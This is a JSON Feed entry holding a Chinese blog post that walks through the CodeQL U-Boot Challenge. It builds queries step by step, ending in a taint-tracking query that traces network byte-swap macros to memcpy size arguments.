{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0的秘密花园",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/06/10/CodeQLU-BootChallenge%20(CC++)/",
            "url": "http://example.com/2022/06/10/CodeQLU-BootChallenge%20(CC++)/",
            "title": "CodeQLU-BootChallenge(CC++)",
            "date_published": "2022-06-10T02:39:31.000Z",
            "content_html": "<p>[toc]</p>\n<h1 id=\"背景\"><a class=\"markdownIt-Anchor\" href=\"#背景\">#</a> 背景</h1>\n<p>需要在 U-Boot 中寻找一组 9 个远程代码执行漏洞<br>\n漏洞点位于 memcpy 函数<br>\n但并非所有调用 memcpy 函数的都存在漏洞<br>\n所以我们需要减少误报率，找到真正存在漏洞的 memcpy 调用</p>\n<p><a href=\"https://lab.github.com/githubtraining/codeql-u-boot-challenge-(cc++)\">放上题目链接</a><br>\n关于环境搭建根据题目提示就可以顺利完成哦<br>\n也可以参考我的文章 &quot;CodeQL for VSCode 搭建流程&quot;<br>\n 不出意外会放在我的<a href=\"https://milkii0.github.io\">博客中</a></p>\n<h1 id=\"step-3-our-first-query\"><a class=\"markdownIt-Anchor\" href=\"#step-3-our-first-query\">#</a> Step 3 - our first query</h1>\n<p>在项目中寻找所有名为’strlen’的函数<br>\n语法类似于 sql 语句<br>\n <code>import cpp</code> : 导入 c++ 规则库<br>\n <code>From Function f1</code> : 声明一个 Function 类的变量为 f1<br>\n <code>where f1.getName() = &quot;strlen&quot;</code> : Function.getName () 顾名思义用于获取此声明的名称，也就是名称和&quot;strlen&quot; 相等的声明会被挑选出来<br>\n <code>select f1,&quot;a function named strlen&quot;</code> : select 后接要在 result 中展示的项目，用逗号分隔<br>\n 3_function_definitions.ql</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cpp</span><br><span class=\"line\"></span><br><span class=\"line\">from Function f1</span><br><span class=\"line\">where f1.getName() = &quot;strlen&quot;</span><br><span class=\"line\">select f1,&quot;a function named strlen&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"f67230350390011a65f16d340406022d.png\" alt=\"f67230350390011a65f16d340406022d.png\"><br>\n 直接在 main 提交<br>\n<img src=\"b20d0a09af05b0e0b6f0889c8bd499fe.png\" alt=\"b20d0a09af05b0e0b6f0889c8bd499fe.png\"><br>\ncommit 中查看结果，通过<br>\n<img src=\"9c74098f2c390ad1f066fa3cd8fc6349.png\" alt=\"9c74098f2c390ad1f066fa3cd8fc6349.png\"></p>\n<h1 id=\"step-4-anatomy-of-a-query\"><a class=\"markdownIt-Anchor\" href=\"#step-4-anatomy-of-a-query\">#</a> Step 4 - Anatomy of a query</h1>\n<p>仿照上一步，在项目中寻找所有名为’memcpy’的函数<br>\n 4_function_definitions.ql</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cpp</span><br><span class=\"line\"></span><br><span class=\"line\">from Function f</span><br><span class=\"line\">where f.getName() = &quot;memcpy&quot;</span><br><span class=\"line\">select f,&quot;a function named memcpy&quot;</span><br></pre></td></tr></table></figure>\n<p>提交查看结果，通过<br>\n<img src=\"e7a2871ee72e24c0663d8b9042c8e434.png\" alt=\"e7a2871ee72e24c0663d8b9042c8e434.png\"></p>\n<h1 id=\"step-5-using-different-classes-and-their-predicates\"><a class=\"markdownIt-Anchor\" href=\"#step-5-using-different-classes-and-their-predicates\">#</a> Step 5 - Using different classes and their predicates</h1>\n<p>自定义规则，查找三个名为 <code>ntohs</code> ,  <code>ntohl</code>  or  <code>ntohll</code>  的宏定义<br>\n需要一个紧凑的查询，而不是三个查找案例组合在一起<br>\n给出以下两种方法</p>\n<ol>\n<li>利用正则表达式<br>\n <code>string</code>  类有一个方法 <code>regexpMatch</code> ，接收器将参数与正则表达式匹配<br>\n那我们需要先找到宏定义，再对该字符串进行正则匹配（使用的 java 的匹配模式）<br>\n5_function_definitions.ql</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cpp</span><br><span class=\"line\"></span><br><span class=\"line\">from Macro m</span><br><span class=\"line\">where m.getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class=\"line\">select m,&quot;macros named ntohs, ntohl or ntohll&quot;</span><br></pre></td></tr></table></figure>\n<p>运行<br>\n<img src=\"dc5f776d88ef17d90e7be870a333f285.png\" alt=\"dc5f776d88ef17d90e7be870a333f285.png\"></p>\n<ol start=\"2\">\n<li>使用集合表达式<br>\n给出的格式：&lt;your_variable_name&gt; in [“bar”, “baz”, “quux”]</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cpp</span><br><span class=\"line\"></span><br><span class=\"line\">from Macro m</span><br><span class=\"line\">where m.getName() in [&quot;ntohs&quot;,&quot;ntohl&quot;,&quot;ntohll&quot;]</span><br><span class=\"line\">select m,&quot;macros named ntohs, ntohl or ntohll&quot;</span><br></pre></td></tr></table></figure>\n<p>运行后和之前的结果相同，提交通过</p>\n<p>PS：<br>\n上学的时候为了过考试自学的 c++，就是一些简单的语法<br>\n看题目说明也没看明白 ntoh 族函数到底是个啥<br>\n后来看见了<a href=\"https://bestwing.me/codeql.html\"> swing 的文章</a><br>\n才知道 ntoh 族函数通常用来进行网络字节序到主机字节序的转换<br>\n其实自己看到的时候就应该去查的，但是因为对题目影响不大就犯懒没去:-(<br>\n以后不能这样了！看见没见过的看不懂的一定要去弄清楚</p>\n<h1 id=\"step-6-relating-two-variables\"><a class=\"markdownIt-Anchor\" href=\"#step-6-relating-two-variables\">#</a> Step 6 - Relating two variables</h1>\n<p>找到所有对 <code>memcpy</code>  函数的调用<br>\n先看看给的例子<br>\n <code>FunctionCall.getTarget()</code>  查询该函数被调用的位置<br>\n直接和 <code>Function</code>  类型的 <code>fcn</code>  对比值，说明他返回的值应该就是 <code>Function</code>  类型（这点在下面优化中会用到）</p>\n<p>通过 <code>Function.hasName()</code>  获取方法名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cpp</span><br><span class=\"line\"></span><br><span class=\"line\">from FunctionCall call, Function fcn</span><br><span class=\"line\">where</span><br><span class=\"line\">  call.getTarget() = fcn and</span><br><span class=\"line\">  fcn.getDeclaringType().getSimpleName() = &quot;map&quot; and</span><br><span class=\"line\">  fcn.getDeclaringType().getNamespace().getName() = &quot;std&quot; and</span><br><span class=\"line\">  fcn.hasName(&quot;find&quot;)</span><br><span class=\"line\">select call</span><br></pre></td></tr></table></figure>\n<p>如果你想要省略中间变量 <code>Function</code> ，使查询的更加紧凑，可以参考以下两个对比<br>\n <code>c1.getClass2()</code>  返回的是 Class2 类型的值，因此可以直接调用 Class2 的方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Class1 c1, Class2 c2</span><br><span class=\"line\">where</span><br><span class=\"line\">  c1.getClass2() = c2 and</span><br><span class=\"line\">  c2.getProp() = &quot;something&quot;</span><br><span class=\"line\">select c1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">from Class1 c1</span><br><span class=\"line\">where c1.getClass2().getProp() = &quot;something&quot;</span><br><span class=\"line\">select c1</span><br></pre></td></tr></table></figure>\n<p>根据以上案例思考<br>\n我们需要找到 <code>memcpy</code>  函数被调用的位置，可以使用<br>\n <code>FunctionCall.getTarget()</code> <br>\n 并希望查询更加紧凑，可以直接获取找到的函数的名称并进行判断<br>\n <code>FunctionCall.getTarget().getName=&quot;memcpy&quot;</code></p>\n<p>6_memcpy_calls.ql</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cpp</span><br><span class=\"line\">from FunctionCall functioncall</span><br><span class=\"line\">where functioncall.getTarget().hasName(&quot;memcpy&quot;)</span><br><span class=\"line\">select functioncall</span><br></pre></td></tr></table></figure>\n<p>提交通过<br>\n<img src=\"40bdea82763f6ab88adaccc6e47931b4.png\" alt=\"40bdea82763f6ab88adaccc6e47931b4.png\"></p>\n<h1 id=\"step-7-relating-two-variables-continued\"><a class=\"markdownIt-Anchor\" href=\"#step-7-relating-two-variables-continued\">#</a> Step 7 - Relating two variables, continued</h1>\n<p>寻找所有对 <code>ntoh*</code>  宏定义的调用</p>\n<p>这里用到的是 <code>MacroInvocation</code>  这个类，顾名思义就是宏定义调用的类<br>\n鼠标悬浮看其注释也能看出来<br>\n<img src=\"69d9e0e24f06860213619664c0c91321.png\" alt=\"69d9e0e24f06860213619664c0c91321.png\"><br>\n 那么我们就可以通过 <code>getMacro()</code>  寻找被调用的宏定义，并得到返回的 <code>Macro</code>  类型值<br>\n再获得找到的 <code>Macro</code>  名称进行正则匹配，即可获得我们想要的结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cpp</span><br><span class=\"line\"> from MacroInvocation macInvo</span><br><span class=\"line\"> where macInvo.getMacro().getName().regexpMatch(&quot;ntoh.*&quot;)</span><br><span class=\"line\"> select macInvo</span><br></pre></td></tr></table></figure>\n<p>（备注：关于正则表达式，不太会写，找的 java 正则 api 看的。<br>\n <code>.</code>  表示匹配除换行符 \\n 之外的任何单字符， <code>*</code>  表示零次或多次，<br>\n我这里希望得到的结果是以 <code>ntoh</code>  开头的宏定义都会被选中。<br>\n如果有不对的地方，还希望可以被提出指正◔ ‸◔）</p>\n<p>提交通过<br>\n<img src=\"5807d43f1ce8796d351638d6f55cde4a.png\" alt=\"5807d43f1ce8796d351638d6f55cde4a.png\"></p>\n<h1 id=\"step-8-changing-the-selected-output\"><a class=\"markdownIt-Anchor\" href=\"#step-8-changing-the-selected-output\">#</a> Step 8 - Changing the selected output</h1>\n<p>根据提示，使用 <code>getExpr()</code>  这个 predicate<br>\n 先看看这个 <code>getExpr()</code>  的注释说明<br>\n是用来获取宏定义表达式的<br>\n如果顶级拓展元素不是表达式，它只是一条语句，将不会被选中列为结果<br>\n<img src=\"09d6ad29dcccc9157677864a39460e27.png\" alt=\"09d6ad29dcccc9157677864a39460e27.png\"><br>\n 使用 <code>select macInvo.getExpr()</code> ，就能获得宏定义调用相关的表达式<br>\n 8_macro_expressions.ql</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cpp</span><br><span class=\"line\"> from MacroInvocation macInvo</span><br><span class=\"line\"> where macInvo.getMacro().getName().regexpMatch(&quot;ntoh.*&quot;)</span><br><span class=\"line\"> select macInvo.getExpr()</span><br></pre></td></tr></table></figure>\n<p>例如点击其中一个结果，就会跳转至下图位置<br>\n<img src=\"82697e23ad6a1cd05073bea662213bf8.png\" alt=\"82697e23ad6a1cd05073bea662213bf8.png\"><br>\n 提交通过<br>\n<img src=\"839b8030c2474b52816e9afc1212d9a1.png\" alt=\"839b8030c2474b52816e9afc1212d9a1.png\"></p>\n<p>那么查询表达式和查询调用的区别是啥？<br>\n看注释说明，<br>\n <code>getExpr()</code> ：<br>\n<em>Gets a top-level expression associated with this macro invocation,if any.<br>\nNote that this predicate will fail if the top-level expanded element is not an expression (for example if it is a statement).<br>\nThis macro is intended to be used with macros that expand to a complete expression.<br>\nIn other cases, it may have multiple results or no results.</em><br>\n 获取关于宏调用的顶级表达式<br>\n注意，如果顶级扩展元素不是一个表达式的话查询将失败（例如，它是一个语句）<br>\n此宏用于扩展为完整表达式的宏，在其他情况下可能会有多个结果或没有结果</p>\n<p><code>getMacro()</code> ：<br>\n<em>Gets the macro that is being accessed.</em><br>\n 获取正在访问的宏</p>\n<p>即 <code>getMacro()</code>  会获取所有调用的宏，即使他只是一个语句<br>\n而 <code>getExpr()</code>  只会获取宏调用的顶级表达式<br>\n所以 <code>getExpr()</code>  得到的结果集应该包含于 <code>getMacro()</code>  的结果集<br>\n这里放上<a href=\"https://www.zhihu.com/question/20750344\">语句和表达式的区别讨论链接</a></p>\n<h1 id=\"step-9-write-your-own-class\"><a class=\"markdownIt-Anchor\" href=\"#step-9-write-your-own-class\">#</a> Step 9 - Write your own class</h1>\n<p>首先看看学习 <code>exists</code>  关键词给出的例子：<br>\n这个规则只是为了获取不秃头的所有人</p>\n<p>不秃头的人都会有头发，那么他们的头发都会对应一个或多个颜色<br>\n其中 <code>t.getHairColor()</code>  会返回一个 <code>string</code>  类型的值，例如 &quot;red&quot;<br>\n 如果我们需要获得不秃头的人，我们并不需要知道他们头发的具体颜色，只需要知道 <code>t.getHairColor()</code>  会返回 <code>string</code>  类型的值即可，因为秃头 <code>getHairColor()</code>  时，不会返回任何值</p>\n<p>所以我们利用 <code>string</code>  类型的变量完成该操作<br>\n更好的方式是使用 <code>exists</code>  关键词，因为我们只是在 <code>where</code>  中使用该变量<br>\n例如， <code>exists(string c | t.getHairColor() = c)</code>  使用了 string 类型的临时变量，用于获取 <code>t.getHairColor()</code>  返回了 <code>string</code>  值的 <code>t</code> ，也就是查询了所有头发颜色的值为 <code>string</code>  类型的人</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Person t</span><br><span class=\"line\">where exists(string c | t.getHairColor() = c)</span><br><span class=\"line\">select t</span><br><span class=\"line\"></span><br><span class=\"line\">/*在CodeQL中，以下代码功能同于以上代码，给出只是为了更好地理解*/</span><br><span class=\"line\">from Person t, string c</span><br><span class=\"line\">where t.getHairColor() = c</span><br><span class=\"line\">select t</span><br></pre></td></tr></table></figure>\n<p>再来看看类定义中给出的案例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class OneTwoThree extends int &#123;</span><br><span class=\"line\">  OneTwoThree() &#123; // characteristic predicate</span><br><span class=\"line\">    this = 1 or this = 2 or this = 3</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  string getAString() &#123; // member predicate</span><br><span class=\"line\">    result = &quot;One, two or three: &quot; + this.toString()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  predicate isEven() &#123; // member predicate</span><br><span class=\"line\">    this = 2</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以上代码定义了一个名为 <code>OneTwoThree</code>  的类，继承于 int<br>\n 类似于构造函数的部分是 <code>this = 1 or this = 2 or this = 3</code> <br>\n 文档中解释说明这个类中包括了 1,2,3 这三个值<br>\n运行以下规则，可以发现 ott 中确实有 1，2，3 这三个值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cpp</span><br><span class=\"line\"> /*from MacroInvocation macInvo</span><br><span class=\"line\"> where macInvo.getMacro().getName().regexpMatch(&quot;ntoh.*&quot;)</span><br><span class=\"line\"> select macInvo.getExpr()*/</span><br><span class=\"line\"> class OneTwoThree extends int &#123;</span><br><span class=\"line\">    OneTwoThree() &#123; // characteristic predicate</span><br><span class=\"line\">      this = 1 or this = 2 or 3=this</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    string getAString() &#123; // member predicate</span><br><span class=\"line\">      result = &quot;One, two or three: &quot; + this.toString()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    predicate isEven() &#123; // member predicate</span><br><span class=\"line\">      this = 2</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  from OneTwoThree ott</span><br><span class=\"line\">  select ott</span><br></pre></td></tr></table></figure>\n<p><img src=\"e4a0cc58f70e7e930a95949605394de8.png\" alt=\"e4a0cc58f70e7e930a95949605394de8.png\"></p>\n<p>其中还有一个熟悉的单词 <code>predicate</code> <br>\n 这个是在类的主体内定义的谓词，是使用变量来限制类中可能的值的逻辑属性<br>\n举个例子，运行以下规则，就会得到值 2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class OneTwoThree extends int &#123;</span><br><span class=\"line\">   OneTwoThree() &#123; // characteristic predicate</span><br><span class=\"line\">     this = 1 or this = 2 or 3=this</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">   string getAString() &#123; // member predicate</span><br><span class=\"line\">     result = &quot;One, two or three: &quot; + this.toString()</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">   predicate isEven() &#123; // member predicate</span><br><span class=\"line\">     this = 2</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> from OneTwoThree ott</span><br><span class=\"line\"> where ott.isEven()</span><br><span class=\"line\"> select ott</span><br></pre></td></tr></table></figure>\n<p>运行截图：<br>\n<img src=\"b7da8682bac3c07ef7a2d8d41cffc090.png\" alt=\"b7da8682bac3c07ef7a2d8d41cffc090.png\"><br>\n 再更改规则如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class OneTwoThree extends int &#123;</span><br><span class=\"line\">   OneTwoThree() &#123; // characteristic predicate</span><br><span class=\"line\">     this = 1 or this = 2 or 3=this</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">   string getAString() &#123; // member predicate</span><br><span class=\"line\">     result = &quot;One, two or three: &quot; + this.toString()</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">   predicate isEven() &#123; // member predicate</span><br><span class=\"line\">     this = 2</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> from OneTwoThree ott</span><br><span class=\"line\"> where ott = 2</span><br><span class=\"line\"> select ott</span><br></pre></td></tr></table></figure>\n<p>他们会得到相同的结果<br>\n<img src=\"c4bff2b9bd1c95c4becc00965b3a52f4.png\" alt=\"c4bff2b9bd1c95c4becc00965b3a52f4.png\"><br>\n 也就是说 <code>where ott.isEven()</code>  和 <code>where ott = 2</code>  做出的是相同的限制<br>\n那么我们也就能更好地理解， <code>predicate</code>  特征是用于限制类中可能值的逻辑属性了</p>\n<p>其中 <code>string getAString()</code>  就不必多说，返回一个字符串，其中包含对应值<br>\n<img src=\"1da4e1a23a80b04ee390a564d069fc2e.png\" alt=\"1da4e1a23a80b04ee390a564d069fc2e.png\"><br>\n 其中我发现一个很神奇事，不知该如何解释<br>\n我将代码中 <code>this=1</code>  改成 <code>1=this</code>  也会得到一样的结果，没有任何不同或报错<br>\n它和赋值语句不同，但好像又具有相似的功能<br>\n在对变量做限制时，例如 <code>where ott = 2</code> ，它就变成了一个符号，用于对两个值进行比较，这里还好理解，因为 sql 语法类似<br>\n但是同样在以下代码中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">predicate isEven() &#123; // member predicate</span><br><span class=\"line\">     this = 2</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p><code>this=2</code>  也是用于对两个值进行比较<br>\n我认为这是由于 <code>predicate</code>  带来的改变，使得其中的代码和 <code>where</code>  后的代码具有相同得到功能<br>\n如果有更好的见解，还不忘赐教</p>\n<p>最后来写题<br>\n题目给了模板和提示<br>\n按照 step8 中的规则进行编写， <code>exists</code>  第二个参数放上 step8 中的 where 条件<br>\n由于 select 由题目给出并为 Expr 的子类，所以我们需要增加一个条件获取宏调用相关表达式<br>\n根据以上 <code>exists</code>  案例可知，我们需要在 <code>mi.getExpr() =</code>  后面写出他返回值的类型，这样当 <code>mi</code>  为表达式时，就会被选中<br>\n <code>NetworkByteSwap</code>  是 <code>Expr</code>  的子类，因此</p>\n<p>9_class_network_byteswap.ql</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cpp</span><br><span class=\"line\"></span><br><span class=\"line\">class NetworkByteSwap extends Expr &#123;</span><br><span class=\"line\">    NetworkByteSwap() &#123; </span><br><span class=\"line\">        exists(MacroInvocation mi | mi.getMacro().getName().regexpMatch(&quot;ntoh.*&quot;) | mi.getExpr() = this)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from NetworkByteSwap n</span><br><span class=\"line\">select n, &quot;Network byte swap&quot;</span><br></pre></td></tr></table></figure>\n<h1 id=\"step-10-data-flow-and-taint-tracking-analysis\"><a class=\"markdownIt-Anchor\" href=\"#step-10-data-flow-and-taint-tracking-analysis\">#</a> Step 10 - Data flow and taint tracking analysis</h1>\n<p>最后一步，进行数据流分析</p>\n<p>先了解以下我们需要查询的函数背景， <code>ntoh*</code>  函数会返回一个数，并用于 <code>memcpy</code>  的第三个参数 <code>size</code> ，所以我们需要追踪的数据流就是从 <code>ntoh*</code>  到 <code>memcpy</code></p>\n<blockquote>\n<p>在 C/C++ 写网络程序的时候，往往会遇到字节的网络顺序和主机顺序的问题。 这时就可能用到 htons (), ntohl (), ntohs ()，htons () 这 4 个网络字节顺序与本地字节顺序之间的转换函数</p>\n</blockquote>\n<blockquote>\n<p>memcpy 指的是 c 和 c++ 使用的内存拷贝函数，memcpy 函数的功能是从源 src 所指的内存地址的起始位置开始拷贝 n 个字节到目标 dest 所指的内存地址的起始位置中</p>\n</blockquote>\n<p>创建 <code>Config</code>  类，查找此类的数据流并进行污染点追踪分析<br>\n进行数据流分析，我们需要用到，部分代码已经在给出的模板中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class=\"line\">import DataFlow::PathGraph</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>我们需要写两个 <code>predicate</code> ，一个是来源 <code>isSource</code> ，一个是接收器 <code>isSink</code></p>\n<p><code>isSource</code>  中我们需要查询 <code>ntoh*</code>  宏定义调用的相关表达式，这一步我们已经在 <code>NetworkByteSwap</code>  中写过了<br>\n <code>isSink</code>  中我们需要查询调用 <code>memcpy</code>  函数时，传入的第三个参数 <code>size</code> ，这一步我们需要新增加的步骤是获取参数</p>\n<p>弄清楚这些后，在编写规则时，根据提示完善代码<br>\n我们就能获得 10_taint_tracking.ql 的答案</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * @kind path-problem</span><br><span class=\"line\"> */</span><br><span class=\"line\"></span><br><span class=\"line\">import cpp</span><br><span class=\"line\">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class=\"line\">import DataFlow::PathGraph</span><br><span class=\"line\"></span><br><span class=\"line\">class NetworkByteSwap extends Expr &#123;</span><br><span class=\"line\">    NetworkByteSwap() &#123; </span><br><span class=\"line\">        exists(MacroInvocation mi| mi.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;) | this = mi.getExpr())</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Config extends TaintTracking::Configuration &#123;</span><br><span class=\"line\">  Config() &#123; this = &quot;NetworkToMemFuncLength&quot; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class=\"line\">    // TODO</span><br><span class=\"line\">    /*获取与此节点对应的表达式（如果有）。</span><br><span class=\"line\">    此谓词仅在表示表达式求值值的节点上具有结果。</span><br><span class=\"line\">    对于从表达式中流出的数据，例如通过引用传递参数时，请使用asDefiningArgument而不是asExpr。*/</span><br><span class=\"line\">    source.asExpr() instanceof NetworkByteSwap</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class=\"line\">    // TODO</span><br><span class=\"line\">    exists(FunctionCall fc | fc.getTarget().hasName(&quot;memcpy&quot;) | sink.asExpr() = fc.getArgument(2))</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\">where cfg.hasFlowPath(source, sink)</span><br><span class=\"line\">select sink, source, sink, &quot;Network byte swap flows to memcpy&quot;</span><br></pre></td></tr></table></figure>\n<h1 